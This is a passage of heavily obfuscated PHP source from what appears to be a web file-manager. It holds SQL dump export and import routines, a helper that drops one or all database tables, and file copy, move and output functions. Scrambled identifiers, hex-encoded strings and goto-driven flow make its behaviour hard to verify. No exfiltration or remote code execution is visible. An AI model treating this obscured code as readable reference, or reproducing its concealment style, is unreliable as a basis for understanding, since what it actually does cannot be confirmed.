$B»ËŠÌ»’[$_SERVER[æ§›¦ÌáØ][29]] == $_SERVER[æ§›¦ÌáØ][1018]) { $c‡–Éˆ¡‚ = json_decode($B»ËŠÌ»’[$_SERVER[æ§›¦ÌáØ][372]], !0); if ($c‡–Éˆ¡‚[$_SERVER[æ§›¦ÌáØ][28]] == date($_SERVER[æ§›¦ÌáØ][704]) && !$c‡–Éˆ¡‚[$_SERVER[æ§›¦ÌáØ][703]]) { continue; } } if ($c ¬Å”„¬Å) { $B»ËŠÌ»’[$_SERVER[æ§›¦ÌáØ][76]] = "\173\x69\x6f\72{$c ¬Å”„¬Å}\x7d" . substr($B»ËŠÌ»’[$_SERVER[æ§›¦ÌáØ][76]], strlen("\x7b\151\x6f\x3a{$B»ËŠÌ»’[$_SERVER[æ§›¦ÌáØ][775]]}\x7d")); $B»ËŠÌ»’[$_SERVER[æ§›¦ÌáØ][775]] = $c ¬Å”„¬Å; } $båÌÄÍÀÒâ[] = $_SERVER[æ§›¦ÌáØ][1019] . $this->sqlEncode($B»ËŠÌ»’) . $_SERVER[æ§›¦ÌáØ][1020]; } $EŞ©ËÍ‰¥ó = "\x49\116\x53\x45\x52\124\x20\x49\116\x54\x4f\40\140{$eŒ…Œ×Æà‘}\x60\40\50\140" . implode($_SERVER[æ§›¦ÌáØ][1021], $C“¿êÅÙ¾Ö) . $_SERVER[æ§›¦ÌáØ][1022]; fwrite($DŠ¶›‰·È, $EŞ©ËÍ‰¥ó . implode($_SERVER[æ§›¦ÌáØ][1023], $båÌÄÍÀÒâ) . $_SERVER[æ§›¦ÌáØ][68] . PHP_EOL); $e÷ç¾…—‚ += $dàãà·¼; if ($AÓ¼ç÷æİ) { $AÓ¼ç÷æİ->update($dàãà·¼); } } while ($fåØÉšÇ‘Ô == $dàãà·¼); goto A¤Å¦æ°ğ ; fÅô…ëÕ£ : $F¬Ò©Ş¢½« = 0; $fåØÉšÇ‘Ô = 10000; $DŠ¶›‰·È = fopen($fˆ×£ïæ, $_SERVER[æ§›¦ÌáØ][1015]); goto FÜÑ‡î³¹¡; d›‘á¼äÓ: if ($AÓ¼ç÷æİ) { $AÓ¼ç÷æİ->task[$_SERVER[æ§›¦ÌáØ][1013]] = $eŒ…Œ×Æà‘; } $AÏ’Îœƒ˜ = $this->model($eŒ…Œ×Æà‘); $e÷ç¾…—‚ = 0; goto fÅô…ëÕ£ ; A¤Å¦æ°ğ : fclose($DŠ¶›‰·È); return $e÷ç¾…—‚; goto Cª®É±ØÑÙ; Cª®É±ØÑÙ: } public function sqlToDb($DÊÖÈñ…’, $CšÄÆ‰ìÜ = null) { goto Fï†Ò¡ø; EÓñŒ±ÎùÆ: if ($C½˜ˆ¼”‚ == $C¯‚éêˆë[1025]) { $FÀšº×…Ô = 50; } while (!feof($bõ–‡µ‹…)) { $c‘±©ÑÜ = trim(fgets($bõ–‡µ‹…)); if (!$c‘±©ÑÜ) { continue; } $EÛğŠÃ¡¨– = $this->sqlDecode($c‘±©ÑÜ, $this->type); if (stripos($EÛğŠÃ¡¨–, $C¯‚éêˆë[353]) === 0) { if (!$AË„™©Ì…¸) { $AË„™©Ì…¸ = $EÛğŠÃ¡¨– . $C¯‚éêˆë[50]; } continue; } if ($CšÄÆ‰ìÜ) { $CšÄÆ‰ìÜ->task[$C¯‚éêˆë[1011]] += 1; } $EÍ÷°„•¹Ö++; $eîƒôââ´á[] = rtrim(rtrim(trim($EÛğŠÃ¡¨–), $C¯‚éêˆë[47]), $C¯‚éêˆë[68]); if ($EÍ÷°„•¹Ö >= $FÀšº×…Ô) { $EÛğŠÃ¡¨– = $AË„™©Ì…¸ . implode($C¯‚éêˆë[47], $eîƒôââ´á); if (!$DËÔˆ·Àé´->execute($EÛğŠÃ¡¨–)) { return !1; } if ($CšÄÆ‰ìÜ) { $CšÄÆ‰ìÜ->update($EÍ÷°„•¹Ö); } $eîƒôââ´á = array(); $EÍ÷°„•¹Ö = 0; } } fclose($bõ–‡µ‹…); goto Bî×ˆùğì; Fï†Ò¡ø: $C¯‚éêˆë =& $_SERVER[æ§›¦ÌáØ]; $DËÔˆ·Àé´ = $this->model()->db(); $bõ–‡µ‹… = @fopen($DÊÖÈñ…’, $C¯‚éêˆë[1024]); goto e¯½ßš‚©‡; e¯½ßš‚©‡: if (!$bõ–‡µ‹…) { return !1; } $EÍ÷°„•¹Ö = 0; $AË„™©Ì…¸ = $C¯‚éêˆë[33]; goto EŠÎÏ»ƒ×Á; Bî×ˆùğì: if (!empty($eîƒôââ´á)) { $EÛğŠÃ¡¨– = $AË„™©Ì…¸ . implode($C¯‚éêˆë[47], $eîƒôââ´á); if (!$DËÔˆ·Àé´->execute($EÛğŠÃ¡¨–)) { return !1; } if ($CšÄÆ‰ìÜ) { $CšÄÆ‰ìÜ->update($EÍ÷°„•¹Ö); } } return !0; goto dºÙ¼…Ìá„; EŠÎÏ»ƒ×Á: $eîƒôââ´á = array(); $FÀšº×…Ô = $this->type == $C¯‚éêˆë[9] ? 500 : 2000; $C½˜ˆ¼”‚ = basename($DÊÖÈñ…’, $C¯‚éêˆë[739]); goto EÓñŒ±ÎùÆ; dºÙ¼…Ìá„: } public function dropTable($e·Î§çÄ¡š = null) { $F‘Ò¾õ±˜â = $this->model()->db(); $C”ôŠ¿Œ = $e·Î§çÄ¡š ? array($e·Î§çÄ¡š) : $F‘Ò¾õ±˜â->getTables(); if (!$C”ôŠ¿Œ) { return; } foreach ($C”ôŠ¿Œ as $e·Î§çÄ¡š) { $F‘Ò¾õ±˜â->execute("\144\x72\157\160\40\164\x61\142\154\x65\x20\151\146\x20\x65\170\x69\x73\164\163\x20\x60{$e·Î§çÄ¡š}\140"); } } private function taskToCache($A‡ê”šğ“™ = null) { $AÇºóğß„ =& $_SERVER[æ§›¦ÌáØ]; if (!$A‡ê”šğ“™) { return; } $dÇ¦ìï¶¥Œ = array($AÇºóğß„[1013] => $A‡ê”šğ“™->task[$AÇºóğß„[1013]], $AÇºóğß„[1011] => $A‡ê”šğ“™->task[$AÇºóğß„[1011]], $AÇºóğß„[1026] => $A‡ê”šğ“™->task[$AÇºóğß„[1026]]); if ($dÇ¦ìï¶¥Œ[$AÇºóğß„[1011]] == $dÇ¦ìï¶¥Œ[$AÇºóğß„[1026]]) { $dÇ¦ìï¶¥Œ[$AÇºóğß„[713]] = 1; } Cache::set($AÇºóğß„[1027] . $A‡ê”šğ“™->task[$AÇºóğß„[393]], $dÇ¦ìï¶¥Œ); $A‡ê”šğ“™->end(); } private function sqlEncode($B¼¡ñ­¬ê³) { $aâ—Šµæ‚Ã =& $_SERVER[æ§›¦ÌáØ]; $CíœÒó§ªª = array(); foreach ($B¼¡ñ­¬ê³ as $aµò’¿ÀŸ) { if (is_array($aµò’¿ÀŸ)) { $aµò’¿ÀŸ = json_encode_force($aµò’¿ÀŸ); } $aµò’¿ÀŸ = addslashes($aµò’¿ÀŸ); $aµò’¿ÀŸ = str_replace(array($aâ—Šµæ‚Ã[1028], $aâ—Šµæ‚Ã[229]), array($aâ—Šµæ‚Ã[1029], $aâ—Šµæ‚Ã[1030]), $aµò’¿ÀŸ); $CíœÒó§ªª[] = str_replace($aâ—Šµæ‚Ã[55], $aâ—Šµæ‚Ã[1031], $aµò’¿ÀŸ); } return $aâ—Šµæ‚Ã[55] . implode($aâ—Šµæ‚Ã[1032], $CíœÒó§ªª) . $aâ—Šµæ‚Ã[55]; } private function sqlDecode($b³õíÍÉ, $a×ÙÕé·â–) { $eÖÓï…çšæ =& $_SERVER[æ§›¦ÌáØ]; $b³õíÍÉ = str_replace(array($eÖÓï…çšæ[1029], $eÖÓï…çšæ[1030]), array($eÖÓï…çšæ[1028], $eÖÓï…çšæ[229]), $b³õíÍÉ); if ($a×ÙÕé·â– == $eÖÓï…çšæ[9]) { $b³õíÍÉ = stripslashes($b³õíÍÉ); } return $b³õíÍÉ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($C°“‡š†ãÇ, $cïİ•Ê£¤©) { goto b‚ˆØè°¦; b‚ˆØè°¦: $E…‡©ùÓ’Ù =& $_SERVER[æ§›¦ÌáØ]; $fÂ‡Êµâ¯° = $cïİ•Ê£¤©; $GLOBALS[$E…‡©ùÓ’Ù[1033]] = $E…‡©ùÓ’Ù[1034] . $C°“‡š†ãÇ; goto eöÇÊê×•Ğ; eöÇÊê×•Ğ: Hook::trigger($E…‡©ùÓ’Ù[1034] . $C°“‡š†ãÇ . $E…‡©ùÓ’Ù[1035], $fÂ‡Êµâ¯°); $aóå‡±ç¯Ğ = self::driverMake($cïİ•Ê£¤©[0]); if (method_exists($aóå‡±ç¯Ğ, $C°“‡š†ãÇ)) { $fêåã¿½²• = @call_user_func_array(array($aóå‡±ç¯Ğ, $C°“‡š†ãÇ), $cïİ•Ê£¤©); } else { if (method_exists($aóå‡±ç¯Ğ, $E…‡©ùÓ’Ù[1036])) { $fêåã¿½²• = @call_user_func_array(array($aóå‡±ç¯Ğ, $C°“‡š†ãÇ), $cïİ•Ê£¤©); } else { if (method_exists(self, $C°“‡š†ãÇ)) { $fêåã¿½²• = @call_user_func_array(array(self, $C°“‡š†ãÇ), $cïİ•Ê£¤©); } else { $fêåã¿½²• = call_user_func_array(array(parent, $C°“‡š†ãÇ), $cïİ•Ê£¤©); } } } goto E¶Ê¯‹Áßî; E¶Ê¯‹Áßî: Hook::trigger($E…‡©ùÓ’Ù[1034] . $C°“‡š†ãÇ . $E…‡©ùÓ’Ù[1037], $fÂ‡Êµâ¯°, $fêåã¿½²•); return $fêåã¿½²•; goto B¨×Áì¸ÃÁ; B¨×Áì¸ÃÁ: } public static function init($Bëòñ¥ËÓ) { return self::driverMake($Bëòñ¥ËÓ); } public static function copy($c³íÅÑø…Ÿ, $eÄ¯¤âÅĞ§, $cİƒòäá±¶ = false, $F†¾¨¥£æö = false) { return self::copyMoveStart($c³íÅÑø…Ÿ, $eÄ¯¤âÅĞ§, $cİƒòäá±¶, $_SERVER[æ§›¦ÌáØ][531], $F†¾¨¥£æö); } public static function move($aµ°¬­ìœ, $eï£¬•££‚, $cÜ¡ÉÛø® = false, $b”¡‹ÎŞÆÜ = false) { return self::copyMoveStart($aµ°¬­ìœ, $eï£¬•££‚, $cÜ¡ÉÛø®, $_SERVER[æ§›¦ÌáØ][533], $b”¡‹ÎŞÆÜ); } private static function copyMoveStart($A½èøå•Á, $a¦¯…ƒÊ, $BòÆ¯ÊíÅ“, $dï‰š¬»è¬, $dˆí³¼÷) { $dÏª†ó§‘Œ =& $_SERVER[æ§›¦ÌáØ]; $FÃÅëĞ’Ä† = array($A½èøå•Á, $a¦¯…ƒÊ, $BòÆ¯ÊíÅ“, $dˆí³¼÷); Hook::trigger($dÏª†ó§‘Œ[1034] . $dï‰š¬»è¬ . $dÏª†ó§‘Œ[1035], $FÃÅëĞ’Ä†); $F…¤÷ÉÀÜÜ = self::copyMove($A½èøå•Á, $a¦¯…ƒÊ, $BòÆ¯ÊíÅ“, $dï‰š¬»è¬, $dˆí³¼÷); Hook::trigger($dÏª†ó§‘Œ[1034] . $dï‰š¬»è¬ . $dÏª†ó§‘Œ[1037], $FÃÅëĞ’Ä†, $F…¤÷ÉÀÜÜ); return $F…¤÷ÉÀÜÜ; } public static function saveFile($DóİŠ½ƒØ», $cÏÇÇ¯Ùµ, $f‰„™ø¼”° = true) { goto c®‚«Ÿö‚˜; fóô¬ä¥‹¡: $cÂÊòóˆ•¹ = self::driverMake($cÏÇÇ¯Ùµ); $AˆæÒ´îò = !1; if ($cÂÊòóˆ•¹->pathParse[$cÁ¹‰Ò†Á[1038]]) { $AˆæÒ´îò = $cÂÊòóˆ•¹; $cÂÊòóˆ•¹ = self::driverMake($cÂÊòóˆ•¹->pathParse[$cÁ¹‰Ò†Á[1038]]); } goto CğªéÚĞ§Ê; eî”½Œ¯ğ: return $FŒá±ïÁ‡; goto f¤òœ¯ß±; FÆíôÄ´öŒ: if (!$f‰„™ø¼”° && self::driverIsSame($C™‘×Ÿª÷ƒ, $cÂÊòóˆ•¹)) { $c¦™´ğ›£ƒ = !1; } $FŒá±ïÁ‡ = self::copyFile($C™‘×Ÿª÷ƒ, $DóİŠ½ƒØ», $cÂÊòóˆ•¹, $eØØ ©’óŒ, $bìÌâñ î[$cÁ¹‰Ò†Á[28]], $c¦™´ğ›£ƒ); if ($AˆæÒ´îò) { $FŒá±ïÁ‡ = $AˆæÒ´îò->getPathOuter($FŒá±ïÁ‡); } goto eî”½Œ¯ğ; c®‚«Ÿö‚˜: $cÁ¹‰Ò†Á =& $_SERVER[æ§›¦ÌáØ]; $bìÌâñ î = self::info($cÏÇÇ¯Ùµ); $C™‘×Ÿª÷ƒ = self::driverMake($DóİŠ½ƒØ»); goto fóô¬ä¥‹¡; CğªéÚĞ§Ê: if ($C™‘×Ÿª÷ƒ->pathParse[$cÁ¹‰Ò†Á[1038]]) { $C™‘×Ÿª÷ƒ = self::driverMake($C™‘×Ÿª÷ƒ->pathParse[$cÁ¹‰Ò†Á[1038]]); } $eØØ ©’óŒ = $cÂÊòóˆ•¹->pathFather($cÏÇÇ¯Ùµ); $c¦™´ğ›£ƒ = !0; goto FÆíôÄ´öŒ; f¤òœ¯ß±: } private static function copyMove($dõ—ğ‡ÅÜç, $fÒà‘¥Í‹µ, $DËè¥ĞÚğ™, $Eè§½ˆ¨², $aÑÀ±’³Ü» = false) { goto E‚µİöä‹Ã; a©ìô‰¯Ã‹: $DÇÔ”¸óÉ¢ = self::driverMake($dõ—ğ‡ÅÜç); $a¯ÈÒé¹‚ = self::driverMake($fÒà‘¥Í‹µ); $e“¤Ò±æÈæ = $Eè§½ˆ¨² == $E«¸ô‡ë[533]; goto cº’ùñÍ×; cº’ùñÍ×: $bğ†°Ãˆ© = !1; if ($a¯ÈÒé¹‚->pathParse[$E«¸ô‡ë[1038]]) { $bğ†°Ãˆ© = $a¯ÈÒé¹‚; $a¯ÈÒé¹‚ = self::driverMake($a¯ÈÒé¹‚->pathParse[$E«¸ô‡ë[1038]]); } if ($DÇÔ”¸óÉ¢->pathParse[$E«¸ô‡ë[1038]]) { $DÇÔ”¸óÉ¢ = self::driverMake($DÇÔ”¸óÉ¢->pathParse[$E«¸ô‡ë[1038]]); } goto C´ˆò¹‰ï‡; d†–µØİ’Ÿ: if ($fÌäíçÖ»’) { if ($Eè§½ˆ¨² == $E«¸ô‡ë[533] && !method_exists($a¯ÈÒé¹‚, $E«¸ô‡ë[1039]) && trim($fÒà‘¥Í‹µ, $E«¸ô‡ë[8]) == trim($a¯ÈÒé¹‚->pathFather($dõ—ğ‡ÅÜç), $E«¸ô‡ë[8])) { if ($DÇÔ”¸óÉ¢->pathThis($dõ—ğ‡ÅÜç) != $aÑÀ±’³Ü» && !$DÇÔ”¸óÉ¢->isTypeObject()) { return $DÇÔ”¸óÉ¢->rename($dõ—ğ‡ÅÜç, $aÑÀ±’³Ü»); } return $a¯ÈÒé¹‚->getPathOuter($dõ—ğ‡ÅÜç); } if (method_exists($a¯ÈÒé¹‚, $Eè§½ˆ¨²)) { return $a¯ÈÒé¹‚->{$Eè§½ˆ¨²}($dõ—ğ‡ÅÜç, $fÒà‘¥Í‹µ, $DËè¥ĞÚğ™); } } $b‚ßô°½£¢ = $DÇÔ”¸óÉ¢->isFile($dõ—ğ‡ÅÜç); if (!$b‚ßô°½£¢ && $a¯ÈÒé¹‚->getType() == $E«¸ô‡ë[711] && $DÇÔ”¸óÉ¢->getType() == $E«¸ô‡ë[106]) { $bâëĞï†‡¯ = $a¯ÈÒé¹‚->copyFolderFromIO($DÇÔ”¸óÉ¢, $dõ—ğ‡ÅÜç, $fÒà‘¥Í‹µ, $DËè¥ĞÚğ™, $e“¤Ò±æÈæ, $aÑÀ±’³Ü»); } else { $bâëĞï†‡¯ = self::copyPath($DÇÔ”¸óÉ¢, $dõ—ğ‡ÅÜç, $a¯ÈÒé¹‚, $fÒà‘¥Í‹µ, $DËè¥ĞÚğ™, $e“¤Ò±æÈæ, $b‚ßô°½£¢, $aÑÀ±’³Ü»); } goto aÍˆ«š; E‚µİöä‹Ã: $E«¸ô‡ë =& $_SERVER[æ§›¦ÌáØ]; if (!$dõ—ğ‡ÅÜç || $dõ—ğ‡ÅÜç == $E«¸ô‡ë[8] || !$fÒà‘¥Í‹µ) { return !1; } ignore_timeout(); goto a©ìô‰¯Ã‹; aÍˆ«š: if ($bâëĞï†‡¯ && $e“¤Ò±æÈæ) { $DÇÔ”¸óÉ¢->remove($dõ—ğ‡ÅÜç); } if ($bğ†°Ãˆ©) { $bâëĞï†‡¯ = $bğ†°Ãˆ©->getPathOuter($bâëĞï†‡¯); } return $bâëĞï†‡¯; goto Fá£ù˜­„; C´ˆò¹‰ï‡: self::check($DÇÔ”¸óÉ¢, $dõ—ğ‡ÅÜç, $a¯ÈÒé¹‚, $fÒà‘¥Í‹µ); Hook::trigger($E«¸ô‡ë[73], $DÇÔ”¸óÉ¢, $dõ—ğ‡ÅÜç, $a¯ÈÒé¹‚, $fÒà‘¥Í‹µ); $fÌäíçÖ»’ = self::driverIsSame($DÇÔ”¸óÉ¢, $a¯ÈÒé¹‚); goto d†–µØİ’Ÿ; Fá£ù˜­„: } private static function check($b³°¨Şù“£, $b èˆÛ¥¾º, $eç ˆ÷‡¾Ÿ, &$d “³ãØÓ) { $F·ùÅõ˜ô± =& $_SERVER[æ§›¦ÌáØ]; if (self::driverIsSame($b³°¨Şù“£, $eç ˆ÷‡¾Ÿ) && $b³°¨Şù“£->isFolder($b èˆÛ¥¾º) && $b³°¨Şù“£->isParentOf($b èˆÛ¥¾º, $d “³ãØÓ)) { show_json(LNG($F·ùÅõ˜ô±[1040]), !1); } if (!$b³°¨Şù“£->exist($b èˆÛ¥¾º)) { show_json(LNG($F·ùÅõ˜ô±[105]), !1); } } private static function copyPath($Aé³Èé¯Ë®, $CÚğ‡©ÄùÎ, $cà§¥âä¿‰, $fœàÓô²è¤, $Fš—»†¯•µ, $f¶Ê†ã“Òí, $dí¥İÎƒÄ, $aççœŞöóœ = false) { goto aÆŸø«õÅ½; aÆŸø«õÅ½: $aØÅÛ¸è¡‚ =& $_SERVER[æ§›¦ÌáØ]; $D‚Ÿëì›« = empty($aççœŞöóœ) && $aççœŞöóœ !== $aØÅÛ¸è¡‚[191] ? $Aé³Èé¯Ë®->pathThis($CÚğ‡©ÄùÎ) : $aççœŞöóœ; if ($Fš—»†¯•µ) { $Aîæ¬å¾é„ = $cà§¥âä¿‰->fileNameExist($fœàÓô²è¤, $D‚Ÿëì›«); $D‚Ÿëì›« = $cà§¥âä¿‰->fileNameAuto($fœàÓô²è¤, $D‚Ÿëì›«, $Fš—»†¯•µ, !$dí¥İÎƒÄ); $Fš—»†¯•µ = $Aîæ¬å¾é„ ? $Fš—»†¯•µ : !1; } goto a…–µÎË©½; a…–µÎË©½: if ($dí¥İÎƒÄ) { return self::copyFile($Aé³Èé¯Ë®, $CÚğ‡©ÄùÎ, $cà§¥âä¿‰, $fœàÓô²è¤, $D‚Ÿëì›«, $f¶Ê†ã“Òí); } if ($Fš—»†¯•µ == REPEAT_RENAME_FOLDER) { $Fš—»†¯•µ = !1; } $a¿ÂÌí = rtrim($fœàÓô²è¤, $aØÅÛ¸è¡‚[8]) . $aØÅÛ¸è¡‚[8] . $D‚Ÿëì›«; goto Aà©èÓßêÑ; aµ‘ËÊå©ø: $bÀîº¶Ş†Ô = is_array($bÀîº¶Ş†Ô) ? $bÀîº¶Ş†Ô : array($aØÅÛ¸è¡‚[74] => array(), $aØÅÛ¸è¡‚[75] => array()); $eî‡Š‰×±ë = array_merge($bÀîº¶Ş†Ô[$aØÅÛ¸è¡‚[74]], $bÀîº¶Ş†Ô[$aØÅÛ¸è¡‚[75]]); foreach ($eî‡Š‰×±ë as $fóÒ…é¥º) { $eí¶ÄØè¾ = $fóÒ…é¥º[$aØÅÛ¸è¡‚[29]] == $aØÅÛ¸è¡‚[193]; $CÚğ‡©ÄùÎ = $Aé³Èé¯Ë®->getPathInner($fóÒ…é¥º[$aØÅÛ¸è¡‚[76]]); $fä’Œ‘ÜÂ = self::copyPath($Aé³Èé¯Ë®, $CÚğ‡©ÄùÎ, $cà§¥âä¿‰, $fœàÓô²è¤, $Fš—»†¯•µ, $f¶Ê†ã“Òí, $eí¶ÄØè¾); if (!$fä’Œ‘ÜÂ) { IO::errorTips($aØÅÛ¸è¡‚[1041] . $CÚğ‡©ÄùÎ . $aØÅÛ¸è¡‚[67] . $fœàÓô²è¤); } } goto A†Ô›¶Á³ù; A†Ô›¶Á³ù: self::copyMoveKeepInfo($Aé³Èé¯Ë®, $CÚğ‡©ÄùÎ, $e¯±èâÀ‰í); return $e¯±èâÀ‰í; goto B°Ú‰™¯Õƒ; Aà©èÓßêÑ: $e¯±èâÀ‰í = $cà§¥âä¿‰->mkdir($cà§¥âä¿‰->getPath($a¿ÂÌí)); $fœàÓô²è¤ = $cà§¥âä¿‰->getPathInner($e¯±èâÀ‰í); $bÀîº¶Ş†Ô = $Aé³Èé¯Ë®->listPath($CÚğ‡©ÄùÎ, !0); goto aµ‘ËÊå©ø; B°Ú‰™¯Õƒ: } private static function copyFile($cÍˆ°¿Ø, $Fª‚ªé‰·Ò, $Eù¥³­Šˆ, $E§ë˜ˆ¡®Ä, $EÀŒÖÏ¯ÆÇ, $Dšò°Ÿ×‰) { goto Bè…îŞ¦‡Ï; dâ•˜åîÇÀ: Hook::trigger($e©æ¬ñ‚Í[1043], $cÍˆ°¿Ø, $Fª‚ªé‰·Ò, $Eù¥³­Šˆ, $E§ë˜ˆ¡®Ä, $EÀŒÖÏ¯ÆÇ, $dÊŠ˜ÖŠË“); if (self::driverIsSame($cÍˆ°¿Ø, $Eù¥³­Šˆ)) { if ($Dšò°Ÿ×‰) { $C°×¥«²ƒó = $Eù¥³­Šˆ->moveFile($Fª‚ªé‰·Ò, $E§ë˜ˆ¡®Ä); } else { $C°×¥«²ƒó = $Eù¥³­Šˆ->copyFile($Fª‚ªé‰·Ò, $E§ë˜ˆ¡®Ä); } Hook::trigger($e©æ¬ñ‚Í[1044], $cÍˆ°¿Ø, $Fª‚ªé‰·Ò, $Eù¥³­Šˆ, $E§ë˜ˆ¡®Ä, $EÀŒÖÏ¯ÆÇ, $C°×¥«²ƒó); self::copyMoveKeepInfo($cÍˆ°¿Ø, $Fª‚ªé‰·Ò, $C°×¥«²ƒó); return $C°×¥«²ƒó; } $b—ÀÒã£¡ƒ = TEMP_FILES; goto eíÂ±î¢ùç; Bè…îŞ¦‡Ï: $e©æ¬ñ‚Í =& $_SERVER[æ§›¦ÌáØ]; $E§ë˜ˆ¡®Ä = $Eù¥³­Šˆ->getPath(rtrim($E§ë˜ˆ¡®Ä, $e©æ¬ñ‚Í[8]) . $e©æ¬ñ‚Í[8] . $EÀŒÖÏ¯ÆÇ); $dÊŠ˜ÖŠË“ = $e©æ¬ñ‚Í[1042] . time() . rand_string(5); goto dâ•˜åîÇÀ; fœ¯Ë¹Å: return $C°×¥«²ƒó; goto B¨ŠÏìæìğ; eíÂ±î¢ùç: if ($GLOBALS[$e©æ¬ñ‚Í[6]][$e©æ¬ñ‚Í[88]][$e©æ¬ñ‚Í[753]]) { $b—ÀÒã£¡ƒ = $GLOBALS[$e©æ¬ñ‚Í[6]][$e©æ¬ñ‚Í[88]][$e©æ¬ñ‚Í[753]]; } $Dšò°Ÿ×‰ = !0; $Bì‹Ïå‹‚ô = $b—ÀÒã£¡ƒ; goto D»Ÿ·Š±·Û; D»Ÿ·Š±·Û: mk_dir($Bì‹Ïå‹‚ô); $A¥ñà‰•–· = $Bì‹Ïå‹‚ô . $dÊŠ˜ÖŠË“; $BŸ³â¹Îµ = $A¥ñà‰•–·; goto D­ÚÃ®çÙŸ; F­äåÎ¾¡: self::remove($BŸ³â¹Îµ); Hook::trigger($e©æ¬ñ‚Í[1044], $cÍˆ°¿Ø, $Fª‚ªé‰·Ò, $Eù¥³­Šˆ, $E§ë˜ˆ¡®Ä, $EÀŒÖÏ¯ÆÇ, $C°×¥«²ƒó); self::copyMoveKeepInfo($cÍˆ°¿Ø, $Fª‚ªé‰·Ò, $C°×¥«²ƒó); goto fœ¯Ë¹Å; D­ÚÃ®çÙŸ: $A¥ñà‰•–· = $cÍˆ°¿Ø->download($Fª‚ªé‰·Ò, $A¥ñà‰•–·); $A¥ñà‰•–· = $cÍˆ°¿Ø->iconvApp($A¥ñà‰•–·); $C°×¥«²ƒó = $Eù¥³­Šˆ->upload($E§ë˜ˆ¡®Ä, $A¥ñà‰•–·, $Dšò°Ÿ×‰); goto F­äåÎ¾¡; B¨ŠÏìæìğ: } private static function copyMoveKeepInfo($dÉ¿¾ŸçÀË, $DÉàç‰Ñ¯à, $fÖÓ°‹Ã“¡) { if (!$fÖÓ°‹Ã“¡) { return; } $Fæ‹„¦ğé = $dÉ¿¾ŸçÀË->info($DÉàç‰Ñ¯à); if (!is_array($Fæ‹„¦ğé)) { return; } IO::setModifyTime($fÖÓ°‹Ã“¡, $Fæ‹„¦ğé[$_SERVER[æ§›¦ÌáØ][84]]); } public static function pathFather($AŒîÄˆâ®) { $F…®¸©ˆÀÓ = IO::init($AŒîÄˆâ®); $F¡ÈÍåĞ² = $F…®¸©ˆÀÓ->pathFather($F…®¸©ˆÀÓ->path); return $F…®¸©ˆÀÓ->getPathOuter($F¡ÈÍåĞ²); } public static function fileOut($d×ÅâÏ¦, $A·È¨•¿Â = false, $BË©Ÿ¶÷Ò = false, $Cøä¥Çøš· = '') { $Aíß¨Ä¦„õ = self::driverMake($d×ÅâÏ¦); if ($Aíß¨Ä¦„õ->isFileOutServer()) { return $Aíß¨Ä¦„õ->fileOutServer($d×ÅâÏ¦, $A·È¨•¿Â, $BË©Ÿ¶÷Ò, $Cøä¥Çøš·); } return $Aíß¨Ä¦„õ->fileOut($d×ÅâÏ¦, $A·È¨•¿Â, $BË©Ÿ¶÷Ò, $Cøä¥Çøš·); } public static function fileOutImage($BÜî…²êƒ³, $C÷ñÀ¼¥ù… = 250) { $dá–¸·À˜© = array(250, 600, 1200, 3000, 5000); for ($F´ºÂ°›Ò¿ = 0; $F´ºÂ°›Ò¿ < count($dá–¸·À˜©); $F´ºÂ°›Ò¿++) { if ($F´ºÂ°›Ò¿ == 0 && $C÷ñÀ¼¥ù… <= $dá–¸·À˜©[$F´ºÂ°›Ò¿]) { $C÷ñÀ¼¥ù… = $dá–¸·À˜©[$F´ºÂ°›Ò¿]; break; } else { if ($C÷ñÀ¼¥ù… > $dá–¸·À˜©[$F´ºÂ°›Ò¿ - 1] && $C÷ñÀ¼¥ù… <= $dá–¸·À˜©[$F´ºÂ°›Ò¿]) { $C÷ñÀ¼¥ù… = $dá–¸·À˜©[$F´ºÂ°›Ò¿]; break; } else { if ($F´ºÂ°›Ò¿ == count($dá–¸·À˜©) - 1 && $C÷ñÀ¼¥ù… > $dá–¸·À˜©[$F´ºÂ°›Ò¿]) { $C÷ñÀ¼¥ù… = $dá–¸·À˜©[$F´ºÂ°›Ò¿]; break; } } } } $e¸Äø´å¯ = self::driverMake($BÜî…²êƒ³); if ($e¸Äø´å¯->isFileOutServer()) { return $e¸Äø´å¯->fileOutImageServer($BÜî…²êƒ³, $C÷ñÀ¼¥ù…); } return $e¸Äø´å¯->fileOutImage($BÜî…²êƒ³, $C÷ñÀ¼¥ù…); } private static function driverIsSame($cÄ±œ‹Õ»‚, $E—Õò«èÖ‘) { goto aÎàÏàÛã°; C–â”‰Æù: if ($cÄ±œ‹Õ»‚->pathDriver == $E—Õò«èÖ‘->pathDriver) { return !0; } return !1; goto A®¢…Ÿ²»; aùÏÛƒì¢…: if ($A•Ó¶àÛõ != $Bªê‰ÄË) { return !1; } if ($A•Ó¶àÛõ == $E­˜Çª´Úš[711]) { return !0; } if ($A•Ó¶àÛõ == $E­˜Çª´Úš[106]) { return !0; } goto C–â”‰Æù; aÎàÏàÛã°: $E­˜Çª´Úš =& $_SERVER[æ§›¦ÌáØ]; $A•Ó¶àÛõ = $cÄ±œ‹Õ»‚->getType(); $Bªê‰ÄË = $E—Õò«èÖ‘->getType(); goto aùÏÛƒì¢…; A®¢…Ÿ²»: } public static function copyUpdate($böÜª¦ÎØí, $f…æ÷Õ—§¶) { goto E¦³ğ Ì; E¦³ğ Ì: $fƒ¹ê”Á×‰ =& $_SERVER[æ§›¦ÌáØ]; if (!IO::exist($böÜª¦ÎØí)) { return !1; } if (!IO::exist($f…æ÷Õ—§¶)) { IO::mkdir($f…æ÷Õ—§¶); } goto D÷Ù—†È«Œ; f—ÎÒ÷—Ú: Hook::trigger($fƒ¹ê”Á×‰[1048], $böÜª¦ÎØí, $f…æ÷Õ—§¶, $b½¬¤èí¢); foreach ($b‚ËŠ¦µ†™ as $b¸ÁœßáÔâ) { IO::mkdir($b¸ÁœßáÔâ); } foreach ($DÓñ‘‘µ†‡ as $b¸ÁœßáÔâ) { IO::copy($b¸ÁœßáÔâ[$fƒ¹ê”Á×‰[1045]], $b¸ÁœßáÔâ[$fƒ¹ê”Á×‰[1046]], REPEAT_REPLACE); } goto a®ºò¿‹¤; D÷Ù—†È«Œ: $a™‘‰™‡š» = self::_listAll($böÜª¦ÎØí); $dŠØ¹·æÙ = self::_listAll($f…æ÷Õ—§¶); $DÓñ‘‘µ†‡ = array(); goto EÙ¯ÍëİÂÓ; EÙ¯ÍëİÂÓ: $b‚ËŠ¦µ†™ = array(); foreach ($a™‘‰™‡š» as $F¼øœ‡’˜ => $b¸ÁœßáÔâ) { if (isset($dŠØ¹·æÙ[$F¼øœ‡’˜])) { if ($b¸ÁœßáÔâ[$fƒ¹ê”Á×‰[77]] == 1) { continue; 